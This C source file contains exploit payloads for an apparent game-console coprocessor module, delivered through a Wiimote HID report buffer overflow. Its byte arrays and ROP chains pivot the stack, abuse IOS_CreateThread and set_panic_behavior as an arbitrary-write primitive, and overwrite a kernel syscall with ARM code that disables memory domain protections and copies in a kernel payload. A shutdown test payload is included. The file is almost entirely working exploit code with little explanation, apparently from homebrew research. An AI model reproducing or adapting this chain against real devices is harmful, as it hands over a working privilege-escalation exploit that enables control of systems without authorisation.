#include <stdint.h>

#define ROP_CHAIN_LOCATION 0x12155e38
#define ARM_KERNEL_LOCATION 0x12158500 // somewhere behind the IOS-PAD bss
#define REPLACE_SYSCALL 0x081298bc // the beginning of set_fault_behavior
#define ARM_CODE_BASE 0x08135000

/*
some notes if we wan't to recover:
we either have 19 * 4 bytes and can then jump to 11f07da8
or 9 * 4 bytes and jump to 11f07b2c
*/

/*
    payload + 1   data
    payload + 87  dest
    payload + 95  size

    this will skip freebuf so let's hope we'll have enough memory
*/
uint8_t upload_data_payload[] = {
    // indicates that data is from wiimote
    0xa1,
    // hid report buffer data
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    // buffer overflow starts here
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    // copy our hid buffer to the destination
    0x11, 0xf1, 0x3c, 0xa2 + 1, // pop {r0, r1, r2, r4, r7, pc}
    0x00, 0x00, 0x00, 0x00, // dest
    0x12, 0x15, 0x63, 0x6a, // src
    0x00, 0x00, 0x00, 0x00, // size
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x11, 0xf0, 0x07, 0x1c, // bl memcpy; mov r3, #0x0; mov r0, r3; ldmia sp!,{ r4 r5 pc }
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x11, 0xf0, 0x7b, 0x2c, // jump back to normal execution
};

// pivots the stack to ROP_CHAIN_LOCATION
uint8_t stackpivot_payload[] = {
    // indicates that data is from wiimote
    0xa1,
    // hid report buffer data
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    // buffer overflow starts here
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    // pivot the stack
    0x11, 0xf1, 0xa7, 0x9a + 1, // pop {r0, r1, r3, pc}
    0x11, 0xf0, 0x07, 0x28, // pop {r4, r5, pc} (will be in lr)
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x11, 0xf7, 0xee, 0x10, // mov lr, r0; mov r0, lr; add sp, sp, #8; ldm sp!, {pc}
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x11, 0xf1, 0xa7, 0xa2 + 1, // pop {r0, r1, r2, r3, r5, r6, r7, pc}
    0x11, 0xf8, 0x31, 0xf8, // thread fun (ignored since the thread is never started)
    0x00, 0x00, 0x00, 0x00, // thread arg
    0x11, 0xf0, 0x05, 0xc0, // thread stack top
    0x00, 0x00, 0x00, 0x68, // thread stack size
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x11, 0xf8, 0x2e, 0x68, // IOS_CreateThread
    0x00, 0x00, 0x00, 0x01, // thread priority
    0x00, 0x00, 0x00, 0x02, // thread flags
    0x11, 0xf1, 0x3e, 0xe6 + 1, // pop {r1, r2, pc}
    0x00, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xfa, 0x00, // stack offset (-0x600)
    0x11, 0xf0, 0x07, 0xbc, // pop {r4-r11, pc}
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x06, // r11 needs to be 6 to pivot the stack
    0x11, 0xf8, 0x2e, 0x14, // stack pivot
};

/* kern bin size at 184 * 4 */
uint32_t final_rop_chain[] = {
    0x11f1a79a + 1, // pop {r0, r1, r3, pc}
    0x11f00728, // pop {r4, r5, pc} (will be in lr)
    0x00000000,
    0x00000000,
    0x11f7ee10, // mov lr, r0; mov r0, lr; add sp, sp, #8; ldm sp!, {pc}
    0x00000000,
    0x00000000,
    0x11f1a7a2 + 1, // pop {r0, r1, r2, r3, r5, r6, r7, pc}
    0x11f831f8, // thread fun (ignored since the thread is never started)
    0x00000000, // thread arg
    0x0812974c, // thread stack top
    0x00000068, // thread stack size
    0x00000000,
    0x00000000,
    0x00000000,
    0x11f82e68, // IOS_CreateThread
    0x00000001, // thread priority
    0x00000002, // thread flags
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xe92d4010, // value: push { r4, lr }
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x00,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xe1a04000, // value: mov r4, r0
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x04,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xe3e00000, // value: mov r0, #0xffffffff
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x08,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xee030f10, // value: mcr p15, #0, r0, c3, c0, #0 (set dacr to r0)
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x0c,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xe1a00004, // value: mov r0, r4
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x10,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xe12fff33, // value: blx r3
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x14,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0x00000000, // value: nop
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x18,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xee17ff7a, // value: clean_loop: mrc p15, 0, r15, c7, c10, 3
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x1c,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0x1afffffd, // value: bne clean_loop
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x20,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xee070f9a, // value: mcr p15, 0, r0, c7, c10, 4
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x24,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xe1a03004, // value: mov r3, r4
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x28,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xe8bd4010, // value: pop { r4, lr }
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x2c,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f19cde + 1, // pop {r0, r1, r3, r4, r5, r7, pc}
    0x00000000,
    0xe12fff13, // value: bx r3 (our code)
    0x00000001, // r3 must be 1 for the arbitrary write
    REPLACE_SYSCALL + 0x30,
    0x00000000,
    0x00000000,
    0x11f10244, // mov r12, r4; mov r0, r12; pop { r4, pc }
    0x00000000,
    0x11f83210, // set_panic_behavior
    0x00000000,
    0x00000000,
    0x11f1a79a + 1, // pop {r0, r1, r3, pc}
    REPLACE_SYSCALL,
    0x00004001, // > 0x4000 flushes all data cache
    0x00000000,
    0x11f830f8, // IOS_FlushDCache
    0x00000000,
    0x00000000,
    0x11f1a7a2 + 1, // pop {r0, r1, r2, r3, r5, r6, r7, pc}
    ARM_CODE_BASE, // dst
    ARM_KERNEL_LOCATION, // src
    0x00000000, // size
    0x08131d04, // kern_memcpy
    0x00000000,
    0x00000000,
    0x00000000,
    0x11f82f60, // set_fault_behavior (privileged stack pivot)
    0x00000000,
    0x00000000,
    /* recovering ios_pad is still kind of broken so this just crashes it
       TODO: properly recover it */
    0xdeadbeef, //0x11f85800, // jump to arm_user
};

/* just a payload I used for testing */
const uint8_t shutdown_payload[] = {
    // indicates that data is from wiimote
    0xa1,
    // hid report buffer data
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    // buffer overflow starts here
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    // jump to ios_shutdown
    0x11, 0xf8, 0x31, 0xf8,
};
